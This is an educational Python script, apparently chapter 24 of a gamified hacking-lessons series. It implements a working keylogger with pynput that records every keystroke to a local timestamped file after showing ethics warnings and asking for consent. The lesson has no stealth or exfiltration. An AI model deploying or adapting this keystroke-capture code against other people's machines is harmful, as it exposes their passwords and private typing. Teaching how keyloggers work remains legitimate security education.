#!/usr/bin/env python3
"""
Chapter 24: Keylogger
This script demonstrates creating a keylogger for educational purposes.
WARNING: Keyloggers are serious privacy violations. Educational use only!
"""

from pynput import keyboard
import datetime

# Global variables
log_file = "keylog.txt"
current_line = []

def on_press(key):
    """
    Called when a key is pressed.
    
    Args:
        key: The key that was pressed
    
    This function captures every keystroke and logs it to a file.
    """
    
    global current_line
    
    try:
        # Get the character
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            current_line.append(char)
            print(char, end='', flush=True)
        else:
            # Special keys
            if key == keyboard.Key.space:
                current_line.append(' ')
                print(' ', end='', flush=True)
            elif key == keyboard.Key.enter:
                # Save line to file
                line = ''.join(current_line)
                save_to_file(line)
                current_line = []
                print()  # New line
            elif key == keyboard.Key.backspace:
                if current_line:
                    current_line.pop()
                print('\b \b', end='', flush=True)
            elif key == keyboard.Key.tab:
                current_line.append('\t')
                print('\t', end='', flush=True)
            else:
                # Other special keys
                key_name = str(key).replace('Key.', '')
                print(f'[{key_name}]', end='', flush=True)
                
    except Exception as e:
        print(f"\n[-] Error: {e}")


def save_to_file(text):
    """
    Saves captured text to log file.
    
    Args:
        text (str): The text to save
    """
    
    if not text.strip():
        return
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] {text}\n")
    except Exception as e:
        print(f"\n[-] Error writing to file: {e}")


def main():
    """
    Main keylogger function.
    """
    
    print("\n" + "🦇"*30)
    print("Chapter 24: Dark Woods - Keylogger Quest")
    print("🦇"*30 + "\n")
    
    print("[!] WARNING: Keyloggers are serious privacy tools!")
    print("[!] Use ONLY for educational purposes")
    print("[!] ONLY on systems you own")
    print("[!] Unauthorized keylogging is illegal!\n")
    
    response = input("[?] Do you understand and agree? (yes/no): ").strip().lower()
    
    if response not in ['yes', 'y']:
        print("[*] Quest cancelled")
        return
    
    print("\n" + "="*60)
    print("Keylogger Starting")
    print("="*60)
    print(f"[*] Log file: {log_file}")
    print("[*] All keystrokes will be captured and saved")
    print("[*] Press Ctrl+C to stop")
    print("[*] Start typing...\n")
    print("="*60 + "\n")
    
    try:
        # Start keyboard listener
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
            
    except KeyboardInterrupt:
        print("\n\n[*] Keylogger stopped")
        
        # Save any remaining text
        if current_line:
            line = ''.join(current_line)
            save_to_file(line)
    
    # Show log file contents
    print("\n" + "="*60)
    print("Captured Data")
    print("="*60)
    
    try:
        with open(log_file, 'r') as f:
            contents = f.read()
            if contents:
                print(contents)
            else:
                print("[*] No data captured")
    except FileNotFoundError:
        print("[*] No log file created")
    
    print("\n" + "="*60)
    print("Quest Complete!")
    print("="*60)
    print("[✓] Created keylogger")
    print("[✓] Captured keystrokes")
    print(f"[✓] Saved to {log_file}")
    print("[*] Remember: Use responsibly!")
    print("="*60 + "\n")


if __name__ == "__main__":
    main()
